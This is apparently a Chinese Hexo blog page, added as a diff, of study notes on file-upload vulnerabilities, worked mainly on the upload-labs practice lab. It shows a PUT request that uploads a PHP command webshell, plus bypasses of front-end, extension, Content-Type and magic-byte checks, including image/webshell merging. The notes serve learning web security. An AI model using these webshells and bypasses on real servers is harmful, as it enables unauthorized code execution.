@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件上传漏洞笔记 | Hexo</title><meta name="keywords" content="web安全"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="教程看的https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1K741147FY里面的有很多没有说直接绕过了就很烦，但是这个教程内容很丰富。教程里面修改东西的我也不知道什么意思他也不说就很烦，我就自己百度找然后都写到笔记里面了 文件上传绕过思路在这个地方找到https:&#x2F;&#x2F;www.bilibili.com&#x2F;read&#x2F;cv6978946&#x2F;  PUT 方法文件上发判断目标开没有开启PUT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞笔记">
+<meta property="og:url" content="http://example.com/2020/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="教程看的https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1K741147FY里面的有很多没有说直接绕过了就很烦，但是这个教程内容很丰富。教程里面修改东西的我也不知道什么意思他也不说就很烦，我就自己百度找然后都写到笔记里面了 文件上传绕过思路在这个地方找到https:&#x2F;&#x2F;www.bilibili.com&#x2F;read&#x2F;cv6978946&#x2F;  PUT 方法文件上发判断目标开没有开启PUT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.3gbizhi.com/2019/1124/thumb_1680_0_20191124050326445.png">
+<meta property="article:published_time" content="2020-12-24T02:38:30.000Z">
+<meta property="article:modified_time" content="2021-05-01T23:57:08.327Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.3gbizhi.com/2019/1124/thumb_1680_0_20191124050326445.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传漏洞笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-02 07:57:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">143</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">59</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.3gbizhi.com/2019/1124/thumb_1680_0_20191124050326445.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-24T02:38:30.000Z" title="发表于 2020-12-24 10:38:30">2020-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-01T23:57:08.327Z" title="更新于 2021-05-02 07:57:08">2021-05-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传漏洞笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>教程看的<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1K741147FY">https://www.bilibili.com/video/BV1K741147FY</a>里面的有很多没有说直接绕过了就很烦，但是这个教程内容很丰富。教程里面修改东西的我也不知道什么意思他也不说就很烦，我就自己百度找然后都写到笔记里面了</strong></p>
+<p>文件上传绕过思路在这个地方找到<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv6978946/">https://www.bilibili.com/read/cv6978946/</a></p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227112040834.png" alt="image-20201227112040834"></p>
+<h1 id="PUT-方法文件上发"><a href="#PUT-方法文件上发" class="headerlink" title="PUT 方法文件上发"></a>PUT 方法文件上发</h1><p>判断目标开没有开启PUT 方法</p>
+<p>向指定资源位置上传其最新内容</p>
+<h2 id="开启PUT"><a href="#开启PUT" class="headerlink" title="开启PUT"></a>开启PUT</h2><p>打开Apache配置文件<strong>httpd.conf</strong>，在上面添加</p>
+<p>找到下面的然后叫注释去掉，加载<code>modules/mod_dav.so</code>和<code>modules/mod_dav_fs.so</code>模块</p>
+<p><code>LoadModule</code>加载特定的DSO模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#LoadModule dav_module modules/mod_dav.so</span><br><span class="line">#LoadModule dav_fs_module modules/mod_dav_fs.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224204819759.png" alt="image-20201224204819759"></p>
+<p>添加<code>DAV On</code></p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224204845178.png" alt="image-20201224204845178"></p>
+<p>在配置文件的最上面添加，<strong>注意一点要最上面</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DavLockDB C:\phpStudy\PHPTutorial\WWW\a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224205715704.png" alt="image-20201224205715704"></p>
+<p>然后重启服务</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224205814859.png" alt="image-20201224205814859"></p>
+<h3 id="查看有没有开启PUT请求"><a href="#查看有没有开启PUT请求" class="headerlink" title="查看有没有开启PUT请求"></a>查看有没有开启PUT请求</h3><p>下面查看有什么方法里面是没有写PUT的请求的</p>
+<p>在终端输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 服务器ip 端口</span><br></pre></td></tr></table></figure>
+
+<p>然后在输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS / HTTP/1.1</span><br><span class="line">Host:  服务器的ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224211627382.png" alt="image-20201224211627382"></p>
+<p>用nc也可以</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224212126057.png" alt="image-20201224212126057"></p>
+<h3 id="用PUT请求上发文件"><a href="#用PUT请求上发文件" class="headerlink" title="用PUT请求上发文件"></a>用PUT请求上发文件</h3><p>用burp发起PUT请求上发webshell到/a/a.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /a/a.php HTTP/1.1</span><br><span class="line">Host: 192.168.31.160</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看见返回的是201</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201225192556437.png" alt="image-20201225192556437"></p>
+<p>我们访问执行命令</p>
+<p>可以看见执行了命令</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201225193001865.png" alt="image-20201225193001865"></p>
+<h1 id="前端检查绕过"><a href="#前端检查绕过" class="headerlink" title="前端检查绕过"></a>前端检查绕过</h1><p>有web服务器，文件上发检查只在前端js来检查，如检查文件后缀名来判断上发的文件</p>
+<p><strong>比如upload-labs的第一关</strong></p>
+<p>下面是他的源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接发送.php文件</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115337934.png" alt="image-20201224115337934"></p>
+<p>看一下页面源代码</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224114822127.png" alt="image-20201224114822127"></p>
+<p>他会调用 checkFile()函数</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115024388.png" alt="image-20201224115024388"></p>
+<p>我们只需要叫html的调用的标签删除就可以了</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115121029.png" alt="image-20201224115121029"></p>
+<p>我把他删除</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115144045.png" alt="image-20201224115144045"></p>
+<p>然后我们发照片</p>
+<p>上传成功</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115220757.png" alt="image-20201224115220757"></p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115234776.png" alt="image-20201224115234776"></p>
+<h1 id="修改文件名绕过"><a href="#修改文件名绕过" class="headerlink" title="修改文件名绕过"></a>修改文件名绕过</h1><p><strong>比如upload-labs的第一关</strong></p>
+<p>上发一个phpinfo.php文件里面内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们叫.php文件改成.png格式</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181232127.png" alt="image-20201226181232127"></p>
+<p>改成png</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181407983.png" alt="image-20201226181407983"></p>
+<p>用burp抓一下</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181518539.png" alt="image-20201226181518539"></p>
+<p>叫文件名改.php</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181616786.png" alt="image-20201226181616786"></p>
+<p>可以看见文件上传成功</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181657727.png" alt="image-20201226181657727"></p>
+<p>访问地址</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181715424.png" alt="image-20201226181715424"></p>
+<h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><p>下面这个照片的括住的就是文件的类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure>
+<p>Content-Type:字段就是指定文件类型的<br><strong>image/png就是png类型的</strong></p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226182236835.png" alt="image-20201226182236835"></p>
+<p>文件类型可以用<code>mimetype</code>命令来查看</p>
+<p>格式 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimetype 要查看的文件名</span><br></pre></td></tr></table></figure>
+
+<p>咧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimetype phpinfo.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190032426.png" alt="image-20201226190032426"><br>如果我们叫php文件名改成png用<code>mimetype</code>命令检查还是显示php类型<br>列</p>
+<p>下面我叫<strong>phpinfo.php</strong>文件改成<strong>phpinfo.png</strong>文件</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190817584.png" alt="image-20201226190817584"></p>
+<p>用<code>mimetype</code>来检查</p>
+<p>可以看见还是php类型</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190958336.png" alt="image-20201226190958336"></p>
+<p>下面是在百度上找到文件类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*.php  		application/x-php</span><br><span class="line">*.gif            image/gif    </span><br><span class="line">*.html    text/html    </span><br><span class="line">*.jpeg    image/jpeg</span><br><span class="line">*.jpg          image/jpeg    </span><br><span class="line">*.js       text/javascript, application/javascript    </span><br><span class="line">*.mp3    audio/mpeg    </span><br><span class="line">*.mp4    audio/mp4, video/mp4    </span><br><span class="line">*.pdf    application/pdf    </span><br><span class="line">*.png    image/png    </span><br><span class="line">*.ppt    application/vnd.ms-powerpoint    </span><br><span class="line">*.txt           text/plain    </span><br><span class="line">*.xml    text/xml, application/xml    </span><br><span class="line">*.zip            aplication/zip    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>演示在比如upload-labs的第二关</strong></p>
+<p>上发一个phpinfo.php文件里面内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>他就会报文件类型不正确</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226183750686.png" alt="image-20201226183750686"></p>
+<p>用burp抓包叫文件名改成png</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226183934420.png" alt="image-20201226183934420"></p>
+<p>发现还是文件上传不正确</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184048804.png" alt="image-20201226184048804"></p>
+<p>在选择一个php文件上传</p>
+<p>用burp抓包，然后我们叫修改文件的类型改成<strong>image/png</strong> 就是<strong>png</strong>类型</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184146860.png" alt="image-20201226184146860"></p>
+<p>然后文件上传成功</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184427789.png" alt="image-20201226184427789"></p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184443032.png" alt="image-20201226184443032"></p>
+<h1 id="修改数据包的内容绕过"><a href="#修改数据包的内容绕过" class="headerlink" title="修改数据包的内容绕过"></a>修改数据包的内容绕过</h1><p>有的过滤会检查文件内容每一个照片里面都有一个前面这个字段来代表文件类型<br>我们抓一个普通的照片上传文件的数据包</p>
+<p>可以看见前面有一个PNG的字符串</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226193145015.png" alt="image-20201226193145015"></p>
+<p><strong>比如upload-labs的第十四关</strong></p>
+<p>上发一个phpinfo.php文件里面内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上发的时候用burp抓包如果叫文件名，和类型给修改成png格式的发现还是发不上去</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201226193531143.png" alt="image-20201226193531143"></p>
+<p>然后我们发一个png文件叫里面的文件给文件内容全部给改成webshell只留下照片的内容头的部分</p>
+<p>上传一个普通照片文件</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084637858.png" alt="image-20201227084637858"></p>
+<p>用burp进行抓包</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084716612.png" alt="image-20201227084716612"></p>
+<p>然后我们叫里面改成webshell只留下照片的内容头的部分</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084821816.png" alt="image-20201227084821816"></p>
+<p>放包就上发上去了</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227095004893.png" alt="image-20201227095004893"></p>
+<p>但是是执行不了的应为他是png文件，可以通过其他的漏洞进行执行比如解析漏洞</p>
+<h1 id="将照片和webshell合成绕过"><a href="#将照片和webshell合成绕过" class="headerlink" title="将照片和webshell合成绕过"></a>将照片和webshell合成绕过</h1><p>他会吧一个webshell的木马复制到照片里面，但是这个有一个问题就是当服务器解析照片的时候可能会受到照片的源码的内容应为webshell的运行</p>
+<p>用<code>copy</code>命令</p>
+<p>我们准备一个文件名叫phpinfo.php</p>
+<p>内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还有一个普通的照片名字zm9kpy.jpg</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227100118849.png" alt="image-20201227100118849"></p>
+<p>命令<code>copy /a zm9kpy.jpg + /b phpinfo.php = a.jpg</code></p>
+<p>照片顺序不要搞错了不然就叫webshell代码插到最前面了</p>
+<p>可以看见生成出来一个a.jpg文件</p>
+<p>编辑出来的照片有的可能查看不了</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110046213.png" alt="image-20201227110046213"></p>
+<p>教程上是这样写的不容易看懂</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227100734663.png" alt="image-20201227100734663"></p>
+<p>照片还是可以打开的</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110144969.png" alt="image-20201227110144969"></p>
+<p>查看照片文件的源代码</p>
+<p>可以看见已经插入上面了</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110517915.png" alt="image-20201227110517915"></p>
+<p><strong>演示在比如upload-labs的第十四关</strong></p>
+<p>用这个照片进行上传可以上传上去</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110633221.png" alt="image-20201227110633221"></p>
+<p>复制照片的链接照片应为是jpg类型的所以执行不了，可以借用其他的漏洞来实现</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110938770.png" alt="image-20201227110938770"></p>
+<p>我在服务器里面叫这个文件名手动改成php文件看看能不能执行</p>
+<p>可以执行</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227111542327.png" alt="image-20201227111542327"></p>
+<h1 id="文件幻术头绕过"><a href="#文件幻术头绕过" class="headerlink" title="文件幻术头绕过"></a>文件幻术头绕过</h1><p>同照片的文件内容前几个自己都是相同的下面的16进制是在一个博客上<a target="_blank" rel="noopener" href="https://blog.csdn.net/Kevinhanser/article/details/81613003">https://blog.csdn.net/Kevinhanser/article/details/81613003</a>找的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jpg=FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">gif=47 49 46 38 39 61</span><br><span class="line">png = 89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<p>我用burp抓一个jpg的数据包看一下16进行的头</p>
+<p>可以看见是相通的</p>
+<p><img src="https://gitee.com/wZass/zp/raw/master/img/image-20201227114401188.png" alt="image-20201227114401188"></p>
+<p><strong>演示在比如upload-labs的第十四关</strong></p>
+<p>看看文件是否能上传上去</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">http://example.com/2020/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post_share"><div class="social-share" data-image="https://pic.3gbizhi.com/2019/1124/thumb_1680_0_20191124050326445.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/24/linux%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7apt%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E8%BE%93%E5%87%BAdpkg%20%E6%97%A0%E6%B3%95%E6%81%A2%E5%A4%8D%E7%9A%84%E8%87%B4%E5%91%BD%E9%94%99%E8%AF%AF/"><img class="prev-cover" src="https://gitee.com/wzass/zp/raw/master/img/image-20201225170357977.png" 